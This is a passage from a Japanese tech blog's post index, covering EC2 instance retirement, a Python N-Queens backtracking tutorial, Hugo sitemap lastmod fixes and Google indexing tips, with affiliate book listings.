Retirement」というメールが来た場合、焦らずに対応できるようにしておきましょう。\nEBSの場合は「インスタンスを停止」させてから「インスタンスを開始」。\ninstant storeの場合は、イメージを作成して、立ち上げて該当インスタンスを削除。\nこれさえ覚えておけば、大丈夫です。\nおすすめの書籍 図解即戦力 Amazon Web Servicesのしくみと技術がこれ1冊でしっかりわかる教科書 【「ITエンジニア本大賞2021」技術書部門 入賞! 】 Amazon Web Servicesのしくみがすぐにわかる! Amazon Web Services(AWS)のしくみや関連技術についてわかりやすく解説する図解本です。エンジニア1年生、IT業界などへの転職・就職を目指す人が、AWS関連の用語、しくみ、クラウドとネットワークの基礎技術などを一通り学ぶことのできる、1冊目の入門書としてふさわしい内容を目指します。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 要点整理から攻略する『AWS認定 データベース-専門知識』 (Compass Booksシリーズ) 「AWS 認定 データベース」に頻出する内容を1冊にまとめました! ■AWS認定とは AWS 認定試験は、AWSに関する知識・スキルを測るための試験です。レベル別・カテゴリー別に認定され、基礎コース・アソシエイト・プロフェッショナルの3つのレベルと、ネットワークやセキュリティなど分野ごとの専門知識(スペシャリティ)があります。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-08T09:39:37+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-08-01-wyoshi/catch_hu6ec1216b51b2643d3fa27f0b3095cdf9_137560_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-08-01-wyoshi/","title":"Amazon EC2 Instance Retirementとメールが来たときの対応"},{"content":"バックトラック 今回はバックトラックを説明していきたいと思います。 今回のバックトラックのロジックは前回の配置フラグの拡張版です。\n配置フラグは上下の利き筋までしかチェックしていませんでしたが今回のバックトラックは左右斜めの対角線上の利き筋もチェックします。\n上下の配置フラグの他に右斜め、左斜めの配置フラグを作ってチェックします。\nブルートフォース、配置フラグでは解の候補を出すに止まりましたが、今回で左右、上下、対角線上とクイーンのすべての利き筋をチェックすることができるますので、プログラム独力で解を出せるようになります。\n出力は解の数となっております。\nブルートフォース、配置フラグ、バックトラックの関係は以下の通りです。\n制約が1個、2個、3個と追加されていくような感じです。\n・ブルートフォース\n制約1個目 1行に1個のクイーンを置く 左右の利き筋をみる\n・配置フラグ\n制約1個目 1行に1個のクイーンを置く 左右の利き筋をみる\n制約2個目 配置フラグで同じ列にクイーンを置けないようにする 上下の利き筋をみる\n・バックトラック\n制約1個目 1行に1個のクイーンを置く 左右の利き筋をみる\n制約2個目 配置フラグで同じ列にクイーンを置けないようにする 上下の利き筋をみる\n制約3個目 配置フラグを拡張し左右斜めにクイーンを置けないようにする 対角線上の利き筋をみる\nプログラムソースは以下のURLにあります。\nhttps://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py03_nqueen.py\nグローバル変数 432,433行目でTOTAL,UNIQUEというグローバル変数が追加されています。\nブルートフォース、配置フラグは解の候補を列挙するにとどまっていましたが、今回からはプログラム内で正解数を出力するようになります。\nTOTALは正解数の総数です。\nUNIQUEですが、NQueenの解は左右ミラー反転、90度、180度、270度と左右反転していくと同じ形のものが結構あります。左右反転して同じ形のものを同一解としてカウントした数がUNIQUEとなります。\n436,437行目にFB,FC配列が追加されています。\nFBが左斜め、FCが右斜めの対角線の利き筋を配置フラグでチェックします。\n対角線上の配置フラグ 対角線の利き筋ですが１次元配列でチェックすることができます。\n図で見てみましょう。\n上下の利き筋について簡単です。\n例えば、1行目の右から2列目にクイーンを置いた場合は2、3、4行目の2列目にクイーンを置けなくなります。\n図 2、3、4行目の右から2列目にクイーンを置いた場合はその他の行の2列目にクイーンを置けなくなります。\n図 図 図 ですのでフラグはクイーンを置いた列番号に立てれば良いことになります。\n2列目だったらFA[1]=1です。\n対角線の利き筋についても計算が必要ではあるのですが法則性があり1次元配列で表現することが可能です。\nFB 左斜め対角線の利き筋について見てみましょう\n左斜め対角線のフラグの位置の計算法則は\n行数-クイーンを置いた列数+(サイズ-1)\nrow-i+(size-1)\nで1次元配列で表現できます。\n図で見てみましょう。\n1行目の1列目にクイーンを置いた場合\n左斜め対角線の利き筋は以下の通りになります。\n1行目1列目 [0,0] 2行目2列目 [1,1] 3行目3列目 [2,2] 4行目4列目 [3,3] 図 row-i+(size-1) で計算してみましょう\n1行目1列目 [0,0] 0-0+(4-1)=3 2行目2列目 [1,1] 1-1+(4-1)=3 3行目3列目 [2,2] 2-2+(4-1)=3 4行目4列目 [3,3] 3-3+(4-1)=3 FB[4] にフラグをたてれば左対角線の利き筋をチェックすることができます。\n2行目3列目にクイーンを置いた場合はどうなるでしょう\n左斜め対角線の利き筋は以下の通りになります。\n1行目2列目 [0,1] 2行目3列目 [1,2] 3行目4列目 [2,3] 図 row-i+(size-1) で計算してみましょう\n1行目2列目 [0,1] 0-1+(4-1)=2 2行目3列目 [1,2] 1-2+(4-1)=2 3行目4列目 [2,3] 2-3+(4-1)=2 FB[3] にフラグをたてれば左対角線の利き筋をチェックすることができます。\nFC 右斜め対角線の利き筋について見てみましょう\n右斜め対角線のフラグの位置の計算法則は\n行数+クイーンを置いた列数\nrow+i\nで1次元配列で表現できます。\n図で見てみましょう。\n1行目の4列目にクイーンを置いた場合\n右斜め対角線の利き筋は以下の通りになります。\n1行目1列目 [0,3] 2行目2列目 [1,2] 3行目3列目 [2,1] 4行目4列目 [3,0] 図 row+iで計算してみましょう\n1行目1列目 [0,3] 0+3=3 2行目2列目 [1,2] 1+2=3 3行目3列目 [2,1] 2+1=3 4行目4列目 [3,0] 3+0=3 FC[4] にフラグをたてれば右対角線の利き筋をチェックすることができます。\n2行目の2列目にクイーンを置いた場合\n右斜め対角線の利き筋は以下の通りになります。\n1行目1列目 [0,2] 2行目2列目 [1,1] 3行目3列目 [2,0] 図 row+iで計算してみましょう\n1行目1列目 [0,2] 0+2=2 2行目2列目 [1,1] 1+1=2 3行目3列目 [2,0] 2+0=2 FC[3] にフラグをたてれば右対角線の利き筋をチェックすることができます。\n長くなりましたので今回はグローバル変数の説明だけで終わります。\n次回は、新しく追加されたmainメソッドからプログラムの概要を説明したいと思います。\n書籍の紹介 UNIXという考え方―その設計思想と哲学 単行本 – 2001/2/23 UNIX系のOSは世界で広く使われている。UNIX、Linux、FreeBSD、Solarisなど、商用、非商用を問わず最も普及したOSのひとつであろう。そしてこのOSは30年にわたって使用され続けているものでもある。なぜこれほど長い間使われてきたのか？ その秘密はUNIXに込められた数々の哲学や思想が握っている。 そもそもUNIXはMulticsという巨大なOSの開発から生まれたものだ。あまりに巨大なMulticsはその複雑さゆえに開発は遅々として進まず、その反省からケン・トンプソンが作ったのがUNIXの初めとされる。その後デニス・リッチーら多数の開発者が携わり、UNIXは発展した。本書はこのUNIXに込められた「思想と哲学」を抽出し、数々のエピソードとともにUNIXの特徴を浮き彫りにしていく。 たとえば本書で述べられているUNIXの発想のひとつとして「過度の対話式インタフェースを避ける」というものがある。UNIXのシステムは初心者には「不親切」なつくり、つまり親切な対話式のインタフェースはほとんどなく、ユーザーがコマンドを実行しようとするときはオプションをつける形をとっている。この形式はオプションをいちいち覚えねばならず、初心者に決してやさしくない。しかしこれはプログラムを小さく単純なものにし、他のプログラムとの結合性を高くする。そして結果としてUNIXのスケーラビリティと移植性の高さを支えることになっているのだ。このような形式で本書では9つの定理と10の小定理を掲げ、UNIXが何を重視し、何を犠牲にしてきたのかを明快に解説している。\n最終章にはMS-DOSなどほかのOSの思想も紹介されている。UNIXの思想が他のOSとどう違うかをはっきり知ることになるだろう。UNIXの本質を理解するうえで、UNIX信者もUNIX初心者にとっても有用な1冊だ。（斎藤牧人）\nAmazonで詳細を見る\nAmazon.co.jpアソシエイトを使用\n詳解 シェルスクリプト 大型本 2006/1/16 Unixのプログラムは「ツール」と呼ばれます。 Unixは、処理を実現するために複数の道具(ツール)を組み合わせる「ソフトウェアツール」という思想の下に設計されているためです。 そしてこれらツールを「組み合わせる」ということこそがUnixの真髄です。 また、シェルスクリプトの作成には言語自体だけでなくそれぞれのツールに対する理解も求められます。 つまり、あるツールが何のためのものであり、それを単体あるいは他のプログラムと組み合わせて利用するにはどのようにすればよいかということを理解しなければなりません。 本書は、Unixシステムへの理解を深めながら、シェルスクリプトの基礎から応用までを幅広く解説します。 標準化されたシェルを通じてUnix(LinuxやFreeBSD、Mac OS XなどあらゆるUnix互換OSを含む)の各種ツールを組み合わせ、 目的の処理を実現するための方法を詳しく学ぶことができます。 Amazonで詳細を見る Amazon.co.jpアソシエイトを使用 UNIXシェルスクリプト マスターピース132 すべてのUNIXエンジニア必携!! サーバー管理、ネットワーク管理など、現場で使えるテクニックを豊富にちりばめたシェルスクリプトサンプル集の決定版。\n知りたいことがきっと見つかる秘密の道具箱。Linux、FreeBSD、MacOS対応。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 [改訂第3版]シェルスクリプト基本リファレンス ──#!/bin/shで、ここまでできる (WEB\u0026#43;DB PRESS plus) 単行本（ソフトカバー） 2017/1/20 定番の1冊『シェルスクリプト基本リファレンス』の改訂第3版。 シェルスクリプトの知識は、プログラマにとって長く役立つ知識です。 本書では、複数のプラットフォームに対応できる移植性の高いシェルスクリプト作成に主眼を置き、 基本から丁寧に解説。 第3版では最新のLinux/FreeBSD/Solarisに加え、組み込み分野等で注目度の高いBusyBoxもサポート。 合わせて、全収録スクリプトに関してWindowsおよびmacOS環境でのbashの動作確認も行い、さらなる移植性の高さを追求。 ますますパワーアップした改訂版をお届けします。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 新しいシェルプログラミングの教科書 単行本 エキスパートを目指せ!! システム管理やソフトウェア開発など、\n実際の業務では欠かせないシェルスクリプトの知識を徹底解説\nほとんどのディストリビューションでデフォルトとなっているbashに特化することで、\n類書と差別化を図るとともに、より実践的なプログラミングを紹介します。\nまたプログラミング手法の理解に欠かせないLinuxの仕組みについてもできるかぎり解説しました。\nイマドキのエンジニア必携の一冊。\n▼目次\nCHAPTER01 シェルってなんだろう\nCHAPTER02 シェルスクリプトとは何か\nCHAPTER03 シェルスクリプトの基本\nCHAPTER04 変数\nCHAPTER05 クォーティング\nCHAPTER06 制御構造\nCHAPTER07 リダイレクトとパイプ\nCHAPTER08 関数\nCHAPTER09 組み込みコマンド\nCHAPTER10 正規表現と文字列\nCHAPTER11 シェルスクリプトの実行方法\nCHAPTER12 シェルスクリプトのサンプルで学ぼう\nCHAPTER13 シェルスクリプトの実用例\nCHAPTER14 テストとデバッグ\nCHAPTER15 読みやすいシェルスクリプト\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-07T16:55:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/chess_hub5f46a8b8fc9e255d0122f98accfe16c_94129_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-04-02-ani/","title":"第5回 pythonでNQueen（エイトクイーン）バックトラック（１）"},{"content":"Hugoを使って記事を作成しているのですが、サイトマップをみてみるとlastmodの値がすべて同じになってました。その原因と解決策を今回は探っていこうと思います。\nHugoの導入や記事の投稿についての情報はHugoで記事の投稿の仕方やデザイナーでもできる初めてのHUGO #01を確認してください。\nGitから更新情報を取得するようにしている Hugoは非常に強力な機能をたくさん持っています。その一つがGitにある情報にアクセスできるという点です。\nこの機能を使えば、Gitに登録した人を投稿者としたり、push した日付を更新日とすることができます。\nつまり、自分で投稿者や更新日を記述する必要がないということになります。\nこのブログでもHugoとGitの連携を行っております。その連携自体は簡単です。\n設定ファイルに\nenableGitInfo: true と記述するだけで、Gitの情報にアクセスできます。\nfrontmatterの記述 Hugoには日付を制御できる設定があります。Hugoがコンテンツ・ページに日付を割り当てる方法を設定することができます。これは、config に frontmatter セクションを追加することで行うことが可能です。\n私の環境では下記のようになっておりました。\nfrontmatter: lastmod: - :fileModTime - :git - lastmod :fileModTimeはコンテンツファイルの最終更新タイムスタンプから日付を取得します。\n:gitではコンテンツファイルの最終リビジョンのGit作成日となります。\nこの設定を使うには、--enableGitInfo が設定されているか、サイト構成で enableGitInfo = true が設定されている必要があります。つまり、先程の設定ファイルに記述した設定となります。\nそして、lastmodです。\nこの設定は上から順に評価されていきます。\n詳細はHugoのfrontmatterを確認してください。\nGit Actioinsで設定したXMLの更新日がすべて同じになった 今回はXMLの作成の際にGitのデータを使用するようにしていました。\nローカルで確認したところ、hugo serverでの動作も、hugoにて書き出したファイルも更新日であるlastmodが正常に表示されていたので問題ないと判断して、Gitにアップしました。\nしかし、Gitではローカルと動作が異なっており、すべて同じ日付となってしまいました。\n一体なぜでしょうか？\nランキングや最新記事の反映で日付が更新された可能性 このサイトでは最新記事やランキングを掲載しております。それらは時間や投稿のタイミングで変化します。そういた変化を検知してしまって日付が変わってしまった可能性が考えられます。\nしかし、そうだとしたら、ローカルでも同様の問題になるかと思うので、この可能性は低そうです。\nGitHub Pagesで別ブランチで管理している このサイトはGitHub Pagesを使って別ブランチで管理しています。つまり、公開ディレクトリにあたる public 部分は前の考察のランキングや最新記事によって全てのページが変更されています。\nそして、別ブランチにアップする。つまり、すべてが書き換わるといったことが起こったのではないでしょうか。\n解決策 解決策はすごくと簡単です。\nGit と連携して lastmod の日付を自動で設定するために、enableGitInfo: true としていました。そして、この設定と同時に、下記のような設定もHugoの設定ファイル（yaml形式）に記述していました。\nfrontmatter: lastmod: - :fileModTime - :git - lastmod ここの frontmatter の記述をすべてコメントアウトにします。\nそれか、優先度のファイルのタイムスタンプから:gitに変更します。\nfrontmatter: lastmod: - :git - :fileModTime - lastmod これでlastmodが正しく表示されるようになりました。\nまとめ lastmod はSEOとしてあまり必要とされていないといった声も聞かれますが、正しく表示しておくことでサイトとしての信頼性は格段に上がると思います。\nHugoとGitの連携を行った際に、更新日など正しく反映されない箇所があった場合は設定などを見直してみましょう。\n簡単なことで問題が解決するかもしれません。\nおすすめの書籍 GitHub実践入門 ~Pull Requestによる開発の変革 (WEB\u0026#43;DB PRESS plus) GitHubの実践的な使い方を、実際に手を動かす形で解説する書籍です。初学者の方にもわかりやすいよう、基本的なGitやGitHubの使い方から、「ソーシャルコーディング」の目玉機能であるPull Requestの送り方・受け方まで解説します。また、外部ツールとの連携、GitHub FlowやGit Flowなど、GitHubを中心とした開発手法についてもしっかり解説しているので、中・上級者の方にも参考になるはずです。 目次 第1章:GitHubの世界へようこそ 第2章:Gitの導入 第3章:GitHubを利用するための準備 第4章:Gitを操作しながら学ぶ 第5章:GitHubの機能を徹底解説 第6章:はじめてのPull Request 第7章:Pull Requestが送られてきたら 第8章:GitHubと連携するツールとサービス 第9章:GitHubを利用した開発フロー 第10章:会社でGitHubを使おう Appendix A:GitHubをサポートするGUIクライアント Appendix B:Gistで手軽にコードを共有 続きを読む 。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 改訂2版 わかばちゃんと学ぶ Git使い方入門〈GitHub、SourceTree、コマンド操作対応〉 マンガと実践で学ぶGitの入門書が最新情報に対応して改訂しました! Gitの概念はもちろん、GitHubについても丁寧に解説しています。これからGitを使い始める人にオススメの1冊です。 本書ではクリック操作でGitを使えるSourceTreeを中心に解説しているので、初心者でも安心です。 はじめにより抜粋 ■せっかく学ぶなら、やっぱり楽しい方がいい 「Gitって難しそう」 「勉強しようとは思っているけど、なかなか一歩が踏み出せない」 そんな方のために、楽しくGitを理解できる本を作りました。 ・個性的なキャラクターたちが登場するマンガ ・感覚的にわかる図解 ・丁寧な実践パート 上記3つの特長で、Gitを無理なく学べます。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-07T11:28:55+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-07-01-wyoshi/catch_hud5f0ce966674d6b97fd2cc6aa77b573d_63288_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-07-01-wyoshi/","title":"SEO対策にXMLの更新日（lastmod）を正しく表示する方法"},{"content":"近年、ブログやWEBサイトを作って公開している人が増えてきました。\nそうした中で、Googleにインデックスされるというのは非常に重大なことです。せっかく書いた記事もGoogleにインデックスされないと検索結果に表示されません。\nGoogleにインデックスされないとき、どうしたら良いのでしょうか？\nブログを公開 まずはブログを公開する際に、GoogleアナリティクスやSearch Consoleの設定などを行いましょう。\nこれによって、どんな人が来ているのかなどを閲覧することができたり、実際にサーバを閲覧することなくGoogleクローラーの状況やインデックスの状況、SEO対策などの機能などが盛りだくさんです。\nそして、Googleだけでなく Bingの方も登録しておくことをオススメします。Bingのクローラーはかなり早く、以前のGoogleのようにインデックスをしてくれます。\nサイトマップをつくる サイトマップと呼ばれるXMLを作成しましょう。\n小規模なサイトやページ同士がしっかりリンクしているサイトであれば不要かもしれませんが、サイトマップは作っているに限ります。\nクローラーはそのサイトマップを見て、サイトの構造を把握していきます。\nもちろん、ページ構成がしっかりしたサイトであればクローラーは内部リンクのみでサイトマップを構築することが可能です。\nクローラーの手助けとなるために、内部リンクをしっかり作り、サイトマップも作っておけばクローラビリティが格段にアップするでしょう。\nサイト公開から半月 サイトを公開してから半月、クローラーが１回来て、サイトマップをのデータからクローラーを開始したようです。\nGoogleで検索しても表示されるようになりました。\nサイト公開から１ヶ月 クローラーはほぼ仕事をしなくなりました。\n来ていないということはなく、来ても数ページクロールして去っていきます。\n新しいページをクロールすることはありませんでした。\n以前の作成したサイトと比較してもクローラーの活動頻度が激減していることは確かです。\n数年前に作成して更新していないサイトのサイトマップのクロール頻度は１週間程度でした。新しく作成したサイトでは1ヶ月過ぎてもサイトマップへのクローラーがきませでした。\n対応策を試す robots.txtを編集する クロールの結果を見ると画像やcss、jsなどにアクセスしていたため、htmlへのクロールを促すために、これらをrobots.txtにて許可しない設定にしてみました。\n理由としては、すべてクロールするようにしてますが、cssやjsなどのファイルもクロールされており、そこにリソースが使われてHTMLまでクロールされていないのではないかと考えたためです。\nUser-agent: Googlebot-Image Allow: /*.jpg$ Allow: /*.png$ Allow: /*.gif$ User-agent: * Disallow: /*.jpg$ Disallow: /*.png$ Disallow: /*.gif$ Disallow: /assets/ Disallow: /404.html Disallow: /js/ Disallow: /ts/ Disallow: /images/ Disallow: /scss/ Disallow: /css/ Allow: / 後でわかったのですが、これは完全にNGです。\nGoogleの記事を呼んでいると、従来のテキストベースから実際のブラウザのように動作し、レンダリング速度なども考慮しているとのことでした。結果、現在は404のページ以外はフルオープンにしております。\nUser-agent: * Disallow: /404.html Allow: / 構造体データを追加 SEO効果があるということで、構造体データを追加してみました。構造化データの仕組みについてはこちらを確認してください。\n効果があるかはまだわかりませんが、Search Consoleを見てみると、数ページは認識しているようです。\nSEO効果があるかと言われると、重要ではないといった話もあるので余力のある方は実装といったことになるかと思います。\n\u0026lt;script type=\u0026#34;application/ld+json\u0026#34;\u0026gt; [{ \u0026#34;@context\u0026#34;: \u0026#34;https://schema.org\u0026#34;, \u0026#34;@type\u0026#34;: \u0026#34;BlogPosting\u0026#34;, \u0026#34;headline\u0026#34;:\u0026#34;Googleにインデックスされないときの対応方法は？\u0026#34;, \u0026#34;mainEntityOfPage\u0026#34;:{ \u0026#34;@type\u0026#34;: \u0026#34;WebPage\u0026#34;, \u0026#34;@id\u0026#34;:\u0026#34;[$URL]\u0026#34; }, \u0026#34;datePublished\u0026#34;:\u0026#34;\u0026#34;, \u0026#34;dateModified\u0026#34;:\u0026#34;\u0026#34;, \u0026#34;publisher\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;Organization\u0026#34;, \u0026#34;name\u0026#34;:\u0026#34;NLP - 最新技術やプログラム、デザインなど様々な情報を提供するサイト\u0026#34;, \u0026#34;logo\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;ImageObject\u0026#34;, \u0026#34;url\u0026#34;:\u0026#34;[$URL]/images/logo.png\u0026#34;} }, \u0026#34;author\u0026#34;: { \u0026#34;@type\u0026#34;: \u0026#34;Person\u0026#34;, \u0026#34;name\u0026#34;:\u0026#34;nlp\u0026#34;, \u0026#34;url\u0026#34;:[\u0026#34;[$URL]/authors/wyoshi/\u0026#34;] } },{ \u0026#34;@context\u0026#34;: \u0026#34;https://schema.org\u0026#34;, \u0026#34;@type\u0026#34;: \u0026#34;BreadcrumbList\u0026#34;, \u0026#34;itemListElement\u0026#34;: [{ \u0026#34;@type\u0026#34;: \u0026#34;ListItem\u0026#34;, \u0026#34;position\u0026#34;: 1, \u0026#34;name\u0026#34;:\u0026#34;NLP - 最新技術やプログラム、デザインなど様々な情報を提供するサイト\u0026#34;, \u0026#34;item\u0026#34;:\u0026#34;[$URL]\u0026#34; }] }] \u0026lt;/script\u0026gt; サイトマップを消す サイトマップ自体へのアクセスが頻繁に行われていないので、サイトマップを消してみました。\nクロールされないかと思いましたが、Bingで新しい記事をクロールして取得されてました。\nしかし、記事のタイトルを変えてもなかなか変わらないのでやはりサイトマップは必要かもしれません。\nタイトルを変える タイトルを変えて、ページに更新をかけてみましたが、クロールされませんでした。\nBingも同様にタイトルを変えただけではクロールされないようでした。\nサイトマップのHTMLを作成する クローラーがクロールしやすいようにサイトマップのHTMLを作成しました。\nこれによって、クローラーが内部リンクを通じて各ページにアクセスできるかなと思いますが、まだ効果の程はわかりません。\nランキングを作成する ランキングページの作成も上記の「サイトマップのHTMLを作成する」のようにクローラビリティを上げるためになります。\nあとは、自分たちでもどんな記事を読まれているのかといった指標をすぐ閲覧できるからです。\nSEO対策 画像のサイズの最適化 画像のサイズが最適化できていなかったので、画像のサイズの最適化を行いました。\nこれによってSEOのスコアを上げることができました。サイトの速度もインデックスされるためには重要な指標になってくるので、きれいな画像を使用したいときは各デバイスに最適化された画像を用意して、サイトの速度を落とさないようにしましょう。\nasideのdiv化 ページに直接関係ない部分をasideタグで書いていたのですが、内部リンクをたどってないのではないかと考えて、asideをdivに変更しました。\nこれによって、効果があるかはわかりませんが……。\n内部リンクを増やす カテゴリーだけでなく、著者のページなどを作成して内部リンクするようにしました。\nこれは若干の効果があって、サイトマップ\nh1タグの正規化 以前はロゴに当たる部分が h1 となっていたので、各ページでタイトルになる部分に h1 が当たるように変更しました。\nロゴに h1 を当てる人が多いかと思いますが、各ページのタイトル部分に当てたほうが、ページのタイトルとh1との整合性が取れます。\nまた、h1は1ページに1つとされていますが、あくまで原則で、何個出てきても大丈夫です。ただし、たくさん使うのはNGになるので注意してください。\nパンくずを追加 孤立ページを出さないように、そして、ページごとの回遊率を上げるためにパンくずを設置しました。\nパンくずはクローラーにとっても内部リンクをたどっていけるようになるのではないかと考えております。\nURL検査を行う クローラーが活動をしていないので、サイトマップへ自動的にアクセスして追加してくれるという望みを諦めて、「URL検査」を使って、手動でクローラーを呼び寄せます。\nこれによって、以前は除外が22件あったものが2月1日では4件まで減りました。\nそして、新しく作成したページも2件ほどGoogle検索に出るようになり、すでにインデックスされていたページは変更が検知され、タイトルの表記が変わりました。\nURL検査は非常に効果的です。\nしかし、記事ページへのアクセスはまだないので、これは再度原因を探る必要があります。\n変更されたのは以前サイトマップに登録されていたページなので、クローラーがサイトマップでインデックスしたものを優先している可能性がありそうです。\nまとめ Googleにインデックスされない問題はかなり多いようです。\nBingでの流入やSNSでの流入はもちろん大事ですが、Googleで検索している人が多い以上対応する必要があります。\nまずは記事の品質を上げて、SEO対策し、そして「URL検査」を行う。そうして、Googleクローラーが来てインデックスされるのを待つほかいまのところありません。\nまた何か動きがあれば掲載してきたいと思います。\nおすすめの書籍 沈黙のWebマーケティング ─Webマーケッター ボーンの逆襲─ アップデート・エディション この商品は固定レイアウトで作成されており、タブレットなど大きいディスプレイを備えた端末で読むことに適しています。また、文字列のハイライトや検索、辞書の参照、引用などの機能が使用できません。 〈電子書籍版に関する注意事項〉 本書は固定レイアウト型の電子書籍です。リフロー型と異なりビューア機能が制限されるほか、端末によって見え方が異なりますので、ご購入前にお使いの端末にて「無料サンプル」をお試しください。 【Web集客で悩むすべての人へ！ 成果を上げる「極意」を伝える。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 いちばんやさしい新しいSEOの教本 第2版 人気講師が教える検索に強いサイトの作り方[MFI対応] (「いちばんやさしい教本」シリーズ) SEO入門の定番書を最新環境に合わせてリニューアル! 「今まで何冊もSEOの本を読みましたが、正統派のSEOの思想が理解出来る一番良質な内容でした」 「セミナー形式で書かれているので、自社サイトに当てはめて作業することができました」 「こんなに洗いざらいノウハウを体系だてて載せていいのか! ?と心配するくらい満足のいく内容でした。」 「何か困った時にバイブル的に活用できる1冊です。」 (以上、前書のAmazonカスタマーレビューより抜粋) SEO(検索エンジン最適化)とは、 「検索結果の上位にサイトを表示すること」ではありません。 「訪問者の目的に応えるサイトを作ること」です。 そのために、対策すべきキーワードを選定し、 サイトの構造を整えることが大切なのです。\nAmazonで詳細を見る Amazon.co.jpアソシエイトを使用 ","date":"2022-02-04T12:03:03+09:00","image":"https://suzukiiichiro.github.io/posts/2022-02-04-01-wyoshi/catch_hu99b3f2f48bb0e7609bdb6185b70654fd_77735_200x0_resize_q75_box.jpg","permalink":"https://suzukiiichiro.github.io/posts/2022-02-04-01-wyoshi/","title":"Googleにインデックスされないときの対応方法は？"},{"content":"配置フラグ（制約テスト高速化） 今回も引き続き配置フラグ（制約テスト高速化）を説明していきたいと思います。 前回はプログラムの概要を説明しましたが、今回はnqueenメソッドの再帰と配置フラグの動きについて図で示しながら説明していきたいとおもいます。\nプログラムソースは以下のURLにあります。\nhttps://github.com/suzukiiichiro/N-Queens/blob/master/03Python/py02_nqueen.py\nプログラムはエイトクイーン(N=8)ですが説明をしやすくするため4x4のN=4で説明します。実際に動かしてプログラムの動作を確認したい方は419,420行目のMAXとSIZEを4に変更してみてください。\nおさらい ブルートフォースからのおさらいとして次の点を押さえておきましょう。\n・442行目のABOARD[row]=i はクイーンを配置する動きです。\n・445行目のnqueen(row+1)は再帰でnqueenメソッドを動かしていますがこれは次の行に進む動きです。\n・438,439は最終行(4行目)までクイーンを置ききった後にCOUNT と各行にクイーンを置いた場所を出力します。\n再帰でnqueenメソッドを呼び出したときは、当然のことなのですがメソッドの先頭435行目に移動します。\n引数で渡されたrow以外のローカル変数はすべて初期化された状態になります。\n・再帰から抜ける部分は2箇所あります。\n一つ目は、438,439行目で最終行(4行目)までクイーンを置ききった後にprintoutする時\n二つ目は、441行目のfor文がSIZE数の数(N=4だと3)だけ回りきったあとです。\n再帰から抜けたときは再帰を呼び出した445行目のすぐ後ろからスタートします。\nローカル変数の状態は再帰を呼び出す直前の状態になります。\n1行前に戻るような動きとなります。\nちなみに441行目のfor i in range(SIZE)は右端から左端に1個ずつクイーンを置こうとする動きです。\n左端までクイーンを置ききったらfor文を抜けるイメージです。\nnqueen メソッドの動き 448行目のnqueen(0)からスタートします。\nメソッドの先頭435行目に移動します。\nrow=0なので440行目の else: に移動します。\n441行目のfor文に入りi=0からスタートします。\n442行目のABOARD[0]=0で1行目の右端にクイーンを設置します。\n図 1個目のクイーンなので当然配置フラグはどれもOの状態ですから443行目のif FA[0] == 0 の条件を満たしてif文の中に入ります。\n右端にクイーンを置いたのですから444行目でFA[0]=1 で右端の位置にフラグをたてます。\n445行目でnqueenを引数1を渡して呼び出して2行目に進みます。\n再帰呼び出しなのでrow=1の状態でメソッドの先頭435行目に移動します。\nrow=1なので440行目の else: に移動します。\n441行目のfor文に入りi=0からスタートします。\n442行目のABOARD[1]=0で2行目の右端にクイーンを設置します。\n図 1行目で既に右端にクイーンを設置していますのでFA[0]は1になりますので443行目のif FA[i]==0の条件を満たしません。\nif文に入らずに次のfor文に進みます。\nこの部分が今回追加された配置フラグの制御になります。\nこの処理のおかげで上下の利き筋に引っかかる場合は次の行に移動するのをやめ探索を効率化することができます。\n441行目で次のfor文に進みi=1となります。\n442行目のABOARD[1]=1で2行目の右から2列目にクイーンを設置します。\n図 1行目で右端にクイーンを置いているのでFAの状態は以下のとおりです。\nFA[0]==1 FA[1]==0 FA[2]==0 FA[3]==0 FA[1]は0なのでif FA[i]==0の条件を満たすのでif 文の中に入ります。\n右端から2列目にクイーンを置いたのですから444行目でFA[1]=1 で右端から2番目の位置にフラグをたてます。\n445行目でnqueenを引数2を渡して呼び出して3行目に進みます。\n再帰呼び出しなのでrow=2の状態でメソッドの先頭435行目に移動します。\nrow=2なので440行目の else: に移動します。\n441行目のfor文に入りi=0からスタートします。\n442行目のABOARD[2]=0で3行目の右端にクイーンを設置します。\n図 1行目で右端に、2行目で右から2列目にクイーンを置いているのでFAの状態は以下のとおりです。\nFA[0]==1 FA[1]==1 FA[2]==0 FA[3]==0 i=0 FA[0]=1なのでif FA[i]==0の条件を満たさずに次のfor文に進みます。\n441行目で次のfor文に進みi=1となります。\n442行目のABOARD[2]=1で3行目の右から2列目にクイーンを設置します。\n図 1行目で右端に、2行目で右から2列目にクイーンを置いているのでFAの状態は以下のとおりです。\nFA[0]==1 FA[1]==1 FA[2]==0 FA[3]==0 i=1 FA[1]=1なのでif FA[i]==0の条件を満たさずに次のfor文に進みます。\n441行目で次のfor文に進みi=2となります。\n442行目のABOARD[2]=2で3行目の右から3列目にクイーンを設置します。\n図 FA[0]==1 FA[1]==1 FA[2]==0 FA[3]==0 i=2 FA[2]=0なのでif FA[i]==0の条件を満たすのでif文の中に入ります。\n右端から3列目にクイーンを置いたのですから444行目でFA[2]=1 で右から3列目の位置にフラグをたてます。\n445行目でnqueenを引数3を渡して呼び出して4行目に進みます。\n再帰呼び出しなのでrow=3の状態でメソッドの先頭435行目に移動します。\nrow=3なので440行目の else: に移動します。\n441行目のfor文に入りi=0からスタートします。\nfor文の中で右端から左端へ順番にクイーンを置いていくことになりますが。\nすでに、1行目で右端、2行目で右から2列目、3行目で右から3列目にクイーンを設置しています。\nFAの状態を見てみると以下の通りです。\nFA[0]==1 FA[1]==1 FA[2]==1 FA[3]==0 